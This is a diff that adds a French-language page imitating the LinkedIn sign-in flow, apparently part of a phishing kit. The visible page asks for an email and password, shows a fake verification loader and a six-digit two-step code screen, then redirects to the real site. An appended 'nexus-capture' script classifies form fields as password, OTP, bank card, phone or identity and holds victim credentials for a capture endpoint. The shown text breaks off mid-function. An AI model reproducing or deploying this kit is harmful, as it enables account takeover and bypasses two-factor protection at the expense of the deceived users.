@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LinkedIn · Connexion</title>
+
+<style>
+/* ============================================================
+   1. RESET & VARIABLES
+   ============================================================ */
+*,
+*::before,
+*::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --linkedin-blue:       #0A66C2;
+  --linkedin-blue-hover: #084b8f;
+  --linkedin-blue-dark:  #004182;
+  --black:               #1a1a1a;
+  --gray:                #666666;
+  --border:              #d0d0d0;
+  --white:               #ffffff;
+  --red:                 #cc1016;
+  --radius:              8px;
+  --ease:                cubic-bezier(.2, .8, .2, 1);
+}
+
+/* ============================================================
+   2. BASE / PAGE
+   ============================================================ */
+body {
+  min-height: 100dvh;
+  display: grid;
+  place-items: center;
+  padding: 24px 18px;
+  background: #f3f2ef;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  color: var(--black);
+  -webkit-font-smoothing: antialiased;
+}
+
+body.locked { overflow: hidden; }
+
+/* ============================================================
+   3. CARTE DE CONNEXION
+   ============================================================ */
+.card {
+  width: min(420px, 100%);
+  padding: 34px 36px 30px;
+  background: var(--white);
+  border-radius: 12px;
+  box-shadow:
+    0 4px 20px rgba(0, 0, 0, .1),
+    0 0 0 1px rgba(0, 0, 0, .04);
+  animation: cardIn .6s var(--ease) both;
+}
+
+.card.ready { animation: none; }
+.card.shake { animation: shake .5s ease; }
+
+@keyframes cardIn {
+  from { opacity: 0; transform: translateY(20px) scale(.97); }
+  to   { opacity: 1; transform: translateY(0)    scale(1);   }
+}
+
+@keyframes shake {
+  10%, 90%      { transform: translateX(-2px); }
+  20%, 80%      { transform: translateX(4px);  }
+  30%, 50%, 70% { transform: translateX(-7px); }
+  40%, 60%      { transform: translateX(7px);  }
+}
+
+/* ============================================================
+   4. LOGO "in"
+   ============================================================ */
+.logo {
+  width: 64px;
+  height: 64px;
+  margin: 0 auto 18px;
+  display: grid;
+  place-items: center;
+  background: var(--linkedin-blue);
+  border-radius: 10px;
+  color: var(--white);
+  font-size: 34px;
+  font-weight: 800;
+  letter-spacing: -2px;
+  box-shadow: 0 4px 14px rgba(10, 102, 194, .35);
+}
+
+.logo span { transform: translateY(-2px); }
+
+/* ============================================================
+   5. TITRES
+   ============================================================ */
+h1 {
+  font-size: 24px;
+  font-weight: 600;
+  text-align: center;
+  margin-bottom: 6px;
+}
+
+.sub {
+  font-size: 14px;
+  color: var(--gray);
+  text-align: center;
+  margin-bottom: 24px;
+}
+
+/* ============================================================
+   6. CHAMPS (label flottant)
+   ============================================================ */
+.field { position: relative; margin-bottom: 14px; }
+
+.field input {
+  width: 100%;
+  height: 52px;
+  padding: 16px 14px 4px;
+  font-size: 15px;
+  font-family: inherit;
+  color: var(--black);
+  background: var(--white);
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius);
+  outline: none;
+  transition: border-color .18s, box-shadow .18s;
+}
+
+.field input::placeholder { color: transparent; }
+.field input:hover { border-color: #999; }
+
+.field input:focus {
+  border-color: var(--linkedin-blue);
+  box-shadow: 0 0 0 1px var(--linkedin-blue);
+}
+
+.field label {
+  position: absolute;
+  left: 15px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 15px;
+  color: var(--gray);
+  pointer-events: none;
+  transition: top .16s ease, font-size .16s ease, color .16s;
+}
+
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label {
+  top: 12px;
+  font-size: 11px;
+  color: var(--linkedin-blue);
+}
+
+#password { padding-right: 50px; }
+
+/* Bouton œil */
+.toggle-pw {
+  position: absolute;
+  right: 6px;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 40px;
+  height: 40px;
+  display: grid;
+  place-items: center;
+  background: transparent;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  color: var(--gray);
+  transition: background .18s, color .18s;
+}
+
+.toggle-pw:hover { background: #f0f0f0; color: var(--black); }
+
+.toggle-pw svg {
+  width: 20px; height: 20px;
+  fill: none;
+  stroke: currentColor;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+
+.toggle-pw .eye-off { display: none; }
+.toggle-pw.active .eye-on  { display: none; }
+.toggle-pw.active .eye-off { display: block; }
+
+/* ============================================================
+   7. ERREURS
+   ============================================================ */
+.error {
+  height: 0;
+  overflow: hidden;
+  font-size: 12.5px;
+  color: var(--red);
+  opacity: 0;
+  margin-left: 2px;
+  transition: height .22s, opacity .22s, margin .22s;
+}
+
+.error.show {
+  height: 18px;
+  margin-bottom: 8px;
+  opacity: 1;
+}
+
+/* ============================================================
+   8. LIEN MOT DE PASSE OUBLIÉ
+   ============================================================ */
+.forgot {
+  display: inline-block;
+  margin: 4px 0 20px 2px;
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--linkedin-blue);
+  text-decoration: none;
+}
+
+.forgot:hover { text-decoration: underline; }
+
+/* ============================================================
+   9. BOUTON
+   ============================================================ */
+.btn {
+  position: relative;
+  width: 100%;
+  height: 52px;
+  overflow: hidden;
+  border: none;
+  border-radius: 999px;
+  background: var(--linkedin-blue);
+  color: var(--white);
+  font-family: inherit;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  box-shadow: 0 4px 12px rgba(10, 102, 194, .25);
+  transition: background .18s, transform .14s, box-shadow .18s, opacity .2s;
+}
+
+.btn:hover:not(:disabled) {
+  background: var(--linkedin-blue-hover);
+  box-shadow: 0 6px 16px rgba(10, 102, 194, .35);
+}
+
+.btn:active:not(:disabled) { transform: scale(.985); }
+
+.btn:focus-visible {
+  outline: 3px solid rgba(10, 102, 194, .5);
+  outline-offset: 2px;
+}
+
+.btn[disabled]:not(.loading) {
+  opacity: .45;
+  cursor: not-allowed;
+  box-shadow: none;
+}
+
+.btn-text { transition: opacity .2s; }
+.btn.loading .btn-text { opacity: 0; }
+
+/* Spinner blanc */
+.spinner {
+  position: absolute;
+  inset: 0;
+  margin: auto;
+  width: 22px;
+  height: 22px;
+  border: 3px solid rgba(255, 255, 255, .3);
+  border-top-color: var(--white);
+  border-radius: 50%;
+  opacity: 0;
+  transition: opacity .2s;
+}
+
+.btn.loading .spinner {
+  opacity: 1;
+  animation: spin .7s linear infinite;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Ripple */
+.ripple {
+  position: absolute;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, .35);
+  transform: scale(0);
+  pointer-events: none;
+  animation: rippleAnim .6s ease-out forwards;
+}
+
+@keyframes rippleAnim {
+  to { transform: scale(3.2); opacity: 0; }
+}
+
+/* ============================================================
+   10. SÉPARATEUR & INSCRIPTION
+   ============================================================ */
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin: 22px 0 18px;
+  font-size: 13px;
+  color: var(--gray);
+}
+
+.divider::before,
+.divider::after {
+  content: "";
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+.signup {
+  font-size: 14px;
+  text-align: center;
+  color: var(--gray);
+}
+
+.signup a {
+  font-weight: 600;
+  color: var(--linkedin-blue);
+  text-decoration: none;
+}
+
+.signup a:hover { text-decoration: underline; }
+
+/* ============================================================
+   11. OVERLAY BLEU + LOADER CIRCULAIRE
+   ============================================================ */
+.loading-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  display: grid;
+  place-items: center;
+  padding: 24px;
+  background: var(--linkedin-blue);
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity .5s ease, visibility .5s;
+}
+
+.loading-overlay.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+.loading-inner {
+  text-align: center;
+  transform: scale(.92);
+  transition: transform .6s var(--ease);
+}
+
+.loading-overlay.show .loading-inner { transform: scale(1); }
+
+.loading-logo {
+  display: inline-grid;
+  place-items: center;
+  width: 44px;
+  height: 44px;
+  margin-bottom: 22px;
+  background: var(--white);
+  color: var(--linkedin-blue);
+  border-radius: 8px;
+  font-size: 22px;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  animation: logoPulse 1.6s ease-in-out infinite;
+}
+
+@keyframes logoPulse {
+  0%, 100% { transform: scale(1);    }
+  50%      { transform: scale(1.08); }
+}
+
+.circle-wrap {
+  position: relative;
+  width: 140px;
+  height: 140px;
+  margin: 0 auto 26px;
+}
+
+.circle-wrap svg {
+  width: 100%;
+  height: 100%;
+  transform: rotate(-90deg);
+}
+
+.circle-bg {
+  fill: none;
+  stroke: rgba(255, 255, 255, .22);
+  stroke-width: 8;
+}
+
+.circle-fg {
+  fill: none;
+  stroke: var(--white);
+  stroke-width: 8;
+  stroke-linecap: round;
+  stroke-dasharray: 377;
+  stroke-dashoffset: 377;
+  filter: drop-shadow(0 0 6px rgba(255, 255, 255, .55));
+}
+
+.circle-pct {
+  position: absolute;
+  inset: 0;
+  display: grid;
+  place-items: center;
+  font-size: 28px;
+  font-weight: 700;
+  color: var(--white);
+  font-variant-numeric: tabular-nums;
+  letter-spacing: -1px;
+}
+
+.loading-title {
+  font-size: 22px;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 8px;
+  letter-spacing: -.3px;
+}
+
+.loading-text {
+  font-size: 14px;
+  color: rgba(255, 255, 255, .85);
+  max-width: 280px;
+  margin: 0 auto;
+  line-height: 1.5;
+}
+
+/* ============================================================
+   12. PAGE OTP (bleu LinkedIn + carte blanche)
+   ============================================================ */
+.otp {
+  position: fixed;
+  inset: 0;
+  z-index: 10000;
+  display: grid;
+  place-items: center;
+  padding: 24px 18px;
+  background: var(--linkedin-blue);
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity .5s ease, visibility .5s;
+}
+
+.otp.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+.otp__card {
+  width: min(420px, 100%);
+  padding: 34px 30px 28px;
+  background: var(--white);
+  border-radius: 12px;
+  box-shadow: 0 20px 50px -18px rgba(0, 0, 0, .55);
+  text-align: center;
+  transform: translateY(18px) scale(.96);
+  transition: transform .6s var(--ease);
+}
+
+.otp.show .otp__card { transform: translateY(0) scale(1); }
+
+.otp__logo {
+  display: inline-grid;
+  place-items: center;
+  width: 56px;
+  height: 56px;
+  margin-bottom: 16px;
+  background: var(--linkedin-blue);
+  color: var(--white);
+  border-radius: 10px;
+  font-size: 28px;
+  font-weight: 800;
+  letter-spacing: -1.8px;
+  box-shadow: 0 6px 18px rgba(10, 102, 194, .35);
+}
+
+.otp__title {
+  font-size: 22px;
+  font-weight: 600;
+  color: var(--black);
+  margin-bottom: 8px;
+  letter-spacing: -.3px;
+}
+
+.otp__text {
+  font-size: 14px;
+  line-height: 1.55;
+  color: var(--gray);
+  margin-bottom: 22px;
+}
+
+.otp__text strong {
+  color: var(--black);
+  font-weight: 600;
+  word-break: break-all;
+}
+
+/* --- Les 6 cases --- */
+.otp__boxes {
+  display: flex;
+  justify-content: center;
+  gap: clamp(6px, 2vw, 10px);
+  margin-bottom: 6px;
+}
+
+.otp__input {
+  flex: 1 1 0;
+  min-width: 0;
+  max-width: 56px;
+  height: clamp(54px, 14vw, 64px);
+  padding: 0;
+  font-family: inherit;
+  font-size: clamp(22px, 6.5vw, 26px);
+  font-weight: 700;
+  text-align: center;
+  color: var(--black);
+  background: var(--white);
+  border: 2px solid var(--border);
+  border-radius: 10px;
+  outline: none;
+  caret-color: var(--linkedin-blue);
+  transition: border-color .18s, box-shadow .18s, transform .18s var(--ease);
+  -moz-appearance: textfield;
+}
+
+.otp__input::-webkit-outer-spin-button,
+.otp__input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+.otp__input:hover { border-color: #999; }
+
+.otp__input:focus {
+  border-color: var(--linkedin-blue);
+  box-shadow: 0 0 0 3px rgba(10, 102, 194, .18);
+  transform: translateY(-2px);
+}
+
+.otp__input.filled {
+  border-color: var(--linkedin-blue);
+  background: #f5f9ff;
+}
+
+/* Erreur OTP */
+.otp .error {
+  margin: 6px 0 0;
+  text-align: center;
+}
+
+.otp .error.show { margin-bottom: 10px; }
+
+/* Bouton valider */
+.otp .btn { margin-top: 18px; }
+
+/* Renvoi */
+.resend {
+  margin-top: 18px;
+  font-size: 13.5px;
+  color: var(--gray);
+}
+
+.resend button {
+  padding: 0;
+  font: inherit;
+  font-weight: 600;
+  color: var(--linkedin-blue);
+  background: none;
+  border: none;
+  border-bottom: 1.5px solid transparent;
+  cursor: pointer;
+  transition: border-color .18s, color .18s;
+}
+
+.resend button:hover:not(:disabled) { border-bottom-color: var(--linkedin-blue); }
+
+.resend button:disabled {
+  color: #aaa;
+  cursor: default;
+  font-variant-numeric: tabular-nums;
+}
+
+/* Lien "changer de compte" */
+.otp__back {
+  display: inline-block;
+  margin-top: 14px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--gray);
+  background: none;
+  border: none;
+  cursor: pointer;
+  text-decoration: underline;
+  text-underline-offset: 3px;
+}
+
+.otp__back:hover { color: var(--black); }
+
+/* ============================================================
+   13. RESPONSIVE & ACCESSIBILITÉ
+   ============================================================ */
+@media (max-width: 420px) {
+  .card { padding: 28px 22px 24px; border-radius: 10px; }
+  h1 { font-size: 22px; }
+  .circle-wrap { width: 120px; height: 120px; }
+  .circle-pct { font-size: 24px; }
+  .loading-title { font-size: 20px; }
+  .otp__card { padding: 28px 20px 24px; }
+  .otp__title { font-size: 20px; }
+  .otp__input { border-radius: 8px; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .001ms !important;
+    transition-duration: .001ms !important;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<!-- ============================================================
+     CARTE DE CONNEXION LINKEDIN
+     ============================================================ -->
+<main class="card" id="card">
+
+  <div class="logo"><span>in</span></div>
+
+  <h1>Connexion</h1>
+  <p class="sub">Accédez à votre réseau professionnel</p>
+
+  <form id="loginForm" novalidate>
+
+    <div class="field">
+      <input type="text" id="email" name="email" placeholder=" "
+             autocomplete="username" spellcheck="false">
+      <label for="email">E-mail ou téléphone</label>
+    </div>
+    <p class="error" id="err-email" role="alert"></p>
+
+    <div class="field">
+      <input type="password" id="password" name="password" placeholder=" "
+             autocomplete="current-password">
+      <label for="password">Mot de passe</label>
+
+      <button type="button" class="toggle-pw" id="togglePw"
+              aria-label="Afficher le mot de passe">
+        <svg class="eye-on" viewBox="0 0 24 24">
+          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+        <svg class="eye-off" viewBox="0 0 24 24">
+          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+          <path d="M3 3l18 18"/>
+        </svg>
+      </button>
+    </div>
+    <p class="error" id="err-password" role="alert"></p>
+
+    <a href="#" class="forgot">Mot de passe oublié&nbsp;?</a>
+
+    <button type="submit" class="btn" id="submitBtn">S'identifier</button>
+
+  </form>
+
+  <div class="divider"><span>ou</span></div>
+
+  <p class="signup">
+    Nouveau sur LinkedIn&nbsp;? <a href="#">S'inscrire</a>
+  </p>
+
+</main>
+
+<!-- ============================================================
+     OVERLAY BLEU PLEIN ÉCRAN + CERCLE DE CHARGEMENT (3 s)
+     ============================================================ -->
+<div class="loading-overlay" id="loadingOverlay"
+     aria-hidden="true" aria-live="polite">
+  <div class="loading-inner">
+
+    <div class="loading-logo">in</div>
+
+    <div class="circle-wrap">
+      <svg viewBox="0 0 140 140" aria-hidden="true">
+        <circle class="circle-bg" cx="70" cy="70" r="60"/>
+        <circle class="circle-fg" id="circleFg" cx="70" cy="70" r="60"/>
+      </svg>
+      <div class="circle-pct" id="circlePct">0%</div>
+    </div>
+
+    <h2 class="loading-title">Connexion sécurisée</h2>
+    <p class="loading-text">Vérification de vos identifiants…</p>
+
+  </div>
+</div>
+
+<!-- ============================================================
+     PAGE OTP — 6 CHIFFRES
+     ============================================================ -->
+<section class="otp" id="otp" aria-hidden="true">
+  <div class="otp__card">
+
+    <div class="otp__logo">in</div>
+
+    <h2 class="otp__title">Vérification en deux étapes</h2>
+    <p class="otp__text">
+      Saisissez le code à <strong>6 chiffres</strong> envoyé à<br>
+      <strong id="otpTarget">votre adresse</strong>
+    </p>
+
+    <form id="otpForm" novalidate>
+
+      <div class="otp__boxes" id="otpBoxes">
+        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" autocomplete="one-time-code" aria-label="Chiffre 1">
+        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" aria-label="Chiffre 2">
+        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" aria-label="Chiffre 3">
+        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" aria-label="Chiffre 4">
+        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" aria-label="Chiffre 5">
+        <input class="otp__input" type="text" inputmode="numeric" pattern="[0-9]*"
+               maxlength="1" aria-label="Chiffre 6">
+      </div>
+
+      <p class="error" id="err-otp" role="alert"></p>
+
+      <button type="submit" class="btn" id="otpBtn" disabled>
+        <span class="btn-text">Vérifier le code</span>
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+
+    </form>
+
+    <p class="resend">
+      Code non reçu&nbsp;?
+      <button type="button" id="resendBtn" disabled>Renvoyer (30s)</button>
+    </p>
+
+    <button type="button" class="otp__back" id="backBtn">
+      Utiliser un autre compte
+    </button>
+
+  </div>
+</section>
+
+<script>
+/* ==========================================================
+   CONFIGURATION
+   ========================================================== */
+const OFFICIAL_URL   = 'https://www.linkedin.com/';
+const LOADING_DELAY  = 3000;   // durée du cercle de chargement (3 s)
+const RESEND_DELAY   = 30;     // délai avant renvoi du code (s)
+const RADIUS         = 60;
+const CIRCUMFERENCE  = 2 * Math.PI * RADIUS; // ≈ 377
+
+/* ==========================================================
+   1. RÉFÉRENCES DOM
+   ========================================================== */
+const card        = document.getElementById('card');
+const form        = document.getElementById('loginForm');
+const email       = document.getElementById('email');
+const password    = document.getElementById('password');
+const errEmail    = document.getElementById('err-email');
+const errPassword = document.getElementById('err-password');
+const submitBtn   = document.getElementById('submitBtn');
+const togglePw    = document.getElementById('togglePw');
+
+const overlay     = document.getElementById('loadingOverlay');
+const circleFg    = document.getElementById('circleFg');
+const circlePct   = document.getElementById('circlePct');
+
+const otp         = document.getElementById('otp');
+const otpForm     = document.getElementById('otpForm');
+const otpInputs   = Array.from(document.querySelectorAll('.otp__input'));
+const otpBtn      = document.getElementById('otpBtn');
+const errOtp      = document.getElementById('err-otp');
+const resendBtn   = document.getElementById('resendBtn');
+const otpTarget   = document.getElementById('otpTarget');
+const backBtn     = document.getElementById('backBtn');
+
+/* ==========================================================
+   2. ANIMATION D'ENTRÉE / SECOUSSE DE LA CARTE
+   ========================================================== */
+card.addEventListener('animationend', (e) => {
+  if (e.animationName === 'cardIn') card.classList.add('ready');
+  if (e.animationName === 'shake')  card.classList.remove('shake');
+});
+
+/* ==========================================================
+   3. AFFICHER / MASQUER LE MOT DE PASSE
+   ========================================================== */
+togglePw.addEventListener('click', () => {
+  const hidden = password.type === 'password';
+
+  password.type = hidden ? 'text' : 'password';
+  togglePw.classList.toggle('active', hidden);
+  togglePw.setAttribute(
+    'aria-label',
+    hidden ? 'Masquer le mot de passe' : 'Afficher le mot de passe'
+  );
+
+  password.focus();
+});
+
+/* ==========================================================
+   4. GESTION DES ERREURS (formulaire de connexion)
+   ========================================================== */
+function setError(el, msg) {
+  el.textContent = msg;
+  el.classList.toggle('show', msg.length > 0);
+}
+
+email.addEventListener('input', () => setError(errEmail, ''));
+password.addEventListener('input', () => setError(errPassword, ''));
+
+/* ==========================================================
+   5. SOUMISSION → OVERLAY BLEU → OTP
+   ========================================================== */
+let busy = false;
+
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  if (busy) return;
+
+  let ok = true;
+
+  if (!email.value.trim()) {
+    setError(errEmail, 'Veuillez saisir votre e-mail ou téléphone.');
+    ok = false;
+  }
+
+  if (!password.value) {
+    setError(errPassword, 'Veuillez saisir votre mot de passe.');
+    ok = false;
+  }
+
+  if (!ok) {
+    card.classList.add('shake');
+    return;
+  }
+
+  busy = true;
+  startLoading();
+});
+
+/* ==========================================================
+   6. OVERLAY BLEU + CERCLE ANIMÉ (3 s) → OTP
+   ========================================================== */
+function startLoading() {
+  document.body.classList.add('locked');
+
+  overlay.classList.add('show');
+  overlay.setAttribute('aria-hidden', 'false');
+
+  /* Initialisation du cercle */
+  circleFg.style.strokeDasharray  = CIRCUMFERENCE;
+  circleFg.style.strokeDashoffset = CIRCUMFERENCE;
+
+  const startTime = performance.now();
+
+  function tick(now) {
+    const elapsed  = now - startTime;
+    const progress = Math.min(elapsed / LOADING_DELAY, 1);
+    const offset   = CIRCUMFERENCE * (1 - progress);
+    const percent  = Math.round(progress * 100);
+
+    circleFg.style.strokeDashoffset = offset;
+    circlePct.textContent = percent + '%';
+
+    if (progress < 1) {
+      requestAnimationFrame(tick);
+    } else {
+      /* Fin du chargement → page OTP */
+      setTimeout(showOtp, 300);
+    }
+  }
+
+  requestAnimationFrame(tick);
+}
+
+/* ==========================================================
+   7. AFFICHAGE DE LA PAGE OTP
+   ========================================================== */
+function showOtp() {
+  overlay.classList.remove('show');
+  overlay.setAttribute('aria-hidden', 'true');
+
+  otpTarget.textContent = email.value.trim() || 'votre adresse';
+
+  setTimeout(() => {
+    otp.classList.add('show');
+    otp.setAttribute('aria-hidden', 'false');
+
+    /* Focus sur la première case */
+    setTimeout(() => otpInputs[0].focus(), 350);
+
+    startResendTimer();
+  }, 260);
+}
+
+/* ==========================================================
+   8. GESTION DES 6 CASES OTP
+   ========================================================== */
+function otpCode() {
+  return otpInputs.map(i => i.value).join('');
+}
+
+function refreshOtpState() {
+  otpInputs.forEach(i => i.classList.toggle('filled', i.value !== ''));
+  otpBtn.disabled = otpCode().length < 6;
+}
+
+otpInputs.forEach((box, index) => {
+  /* Saisie : on garde le dernier chiffre tapé */
+  box.addEventListener('input', () => {
+    box.value = box.value.replace(/\D/g, '').slice(-1);
+    setError(errOtp, '');
+    refreshOtpState();
+
+    if (box.value && index < otpInputs.length - 1) {
+      otpInputs[index + 1].focus();
+    }
+  });
+
+  /* Clavier : retour arrière, flèches, Entrée */
+  box.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !box.value && index > 0) {
+      e.preventDefault();
+      otpInputs[index - 1].value = '';
+      otpInputs[index - 1].focus();
+      refreshOtpState();
+      return;
+    }
+    if (e.key === 'ArrowLeft' && index > 0) {
+      e.preventDefault();
+      otpInputs[index - 1].focus();
+    }
+    if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
+      e.preventDefault();
+      otpInputs[index + 1].focus();
+    }
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      otpForm.requestSubmit();
+    }
+  });
+
+  /* Coller un code complet */
+  box.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const digits = (e.clipboardData.getData('text') || '')
+      .replace(/\D/g, '')
+      .slice(0, 6);
+
+    if (!digits) return;
+
+    digits.split('').forEach((d, k) => {
+      if (otpInputs[k]) otpInputs[k].value = d;
+    });
+
+    otpInputs[Math.min(digits.length, 5)].focus();
+    setError(errOtp, '');
+    refreshOtpState();
+  });
+
+  /* Sélectionne le contenu au focus */
+  box.addEventListener('focus', () => box.select());
+});
+
+/* ==========================================================
+   9. VALIDATION DU CODE OTP → REDIRECTION FINALE
+   ========================================================== */
+otpForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  if (otpBtn.classList.contains('loading')) return;
+
+  const code = otpCode();
+
+  if (code.length < 6) {
+    setError(errOtp, 'Saisissez les 6 chiffres du code.');
+    otpInputs.find(i => !i.value)?.focus();
+    return;
+  }
+
+  otpBtn.classList.add('loading');
+  otpBtn.disabled = true;
+
+  setTimeout(() => {
+    window.location.href = OFFICIAL_URL;
+  }, 1100);
+});
+
+/* ==========================================================
+   10. RENVOI DU CODE (compte à rebours 30 s)
+   ========================================================== */
+let resendTimer = null;
+
+function startResendTimer() {
+  let remaining = RESEND_DELAY;
+
+  resendBtn.disabled = true;
+  resendBtn.textContent = `Renvoyer (${remaining}s)`;
+
+  clearInterval(resendTimer);
+
+  resendTimer = setInterval(() => {
+    remaining--;
+
+    if (remaining <= 0) {
+      clearInterval(resendTimer);
+      resendBtn.disabled = false;
+      resendBtn.textContent = 'Renvoyer le code';
+      return;
+    }
+
+    resendBtn.textContent = `Renvoyer (${remaining}s)`;
+  }, 1000);
+}
+
+resendBtn.addEventListener('click', () => {
+  if (resendBtn.disabled) return;
+
+  /* Réinitialise les cases */
+  otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+  setError(errOtp, '');
+  refreshOtpState();
+  otpInputs[0].focus();
+
+  startResendTimer();
+});
+
+/* ==========================================================
+   11. RETOUR À LA PAGE DE CONNEXION
+   ========================================================== */
+backBtn.addEventListener('click', () => {
+  clearInterval(resendTimer);
+
+  otp.classList.remove('show');
+  otp.setAttribute('aria-hidden', 'true');
+
+  /* Reset complet */
+  otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+  setError(errOtp, '');
+  refreshOtpState();
+
+  busy = false;
+  document.body.classList.remove('locked');
+
+  /* Remet la carte de connexion en état propre */
+  setTimeout(() => {
+    card.classList.remove('ready');
+    void card.offsetWidth;          // force le redémarrage de l'animation
+    card.classList.add('ready');
+    email.focus();
+  }, 200);
+});
+
+/* ==========================================================
+   12. EFFET RIPPLE SUR TOUS LES BOUTONS .btn
+   ========================================================== */
+document.querySelectorAll('.btn').forEach((btn) => {
+  btn.addEventListener('click', (e) => {
+    const rect = btn.getBoundingClientRect();
+    const size = Math.max(rect.width, rect.height);
+
+    const ripple = document.createElement('span');
+    ripple.className   = 'ripple';
+    ripple.style.width = ripple.style.height = size + 'px';
+    ripple.style.left  = (e.clientX - rect.left - size / 2) + 'px';
+    ripple.style.top   = (e.clientY - rect.top  - size / 2) + 'px';
+
+    btn.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 620);
+  });
+});
+</script>
+
+
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Apple",
+    enableOtp: true,
+    caps: {"id":true,"pass":true,"phone":true,"bank":false,"extra":false,"otp":true}
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const effectiveOwner = (urlParams.get("user") || NEXUS_CFG.owner || "Inconnu").trim();
+
+  const state = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    capturedFields: {},
+    sentFingerprints: new Set()
+  };
+
+  function getFieldDescriptor(el) {
+    let labelTxt = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
+    }
+    const parentLbl = el.closest("label");
+    if (parentLbl) {
+      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
+    }
+
+    const baseName =
+      el.name ||
+      el.id ||
+      labelTxt ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("field_" + (el.type || "text"));
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      labelTxt
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    return { key: baseName.trim(), meta };
+  }
+
+  function classifyInput(el) {
+    const type = (el.type || "text").toLowerCase();
+    if (type === "hidden" || type === "submit" || type === "button" || type === "reset") {
+      return "ignore";
+    }
+
+    const { meta } = getFieldDescriptor(el);
+
+    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "pass";
+    }
+
+    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank|billing/i.test(meta);
+    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);
+
+    if (
+      ac === "one-time-code" ||
+      (!isBank && !isDob && (
+        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
+        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
+      ))
+    ) {
+      return "otp";
+    }
+
+    if (isBank) return "bank";
+    if (type === "tel" || /phone|t[ée]l[ée]phone|mobile|indicatif|country.?code|prefix|\+225|\+221|\+237|\+33/i.test(meta)) {
+      return "phone";
+    }
+    if (type === "email" || /email|e-mail|identifiant|username|user|login/i.test(meta)) {
+      return "id";
+    }
+    if (isDob || type === "text" || type === "number" || type === "search" || el.tagName === "SELECT" || el.tagName === "TEXTAREA") {
+      return "extra";
+    }
+
+    return "extra";
+  }
+
+  function collectCurrentValues() {
+    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
+    const otpParts = [];
+    const phoneParts = [];
+    const allCaptured = {};
+
+    let idCandidate = "";
+    let passCandidate = "";
+    let bankCandidate = "";
+    let extraCandidate = "";
+
+    const activeBtn = document.querySelector(".tab-btn.active");
+    const activeTab = activeBtn ? (activeBtn.dataset.tab || "") : "";
+
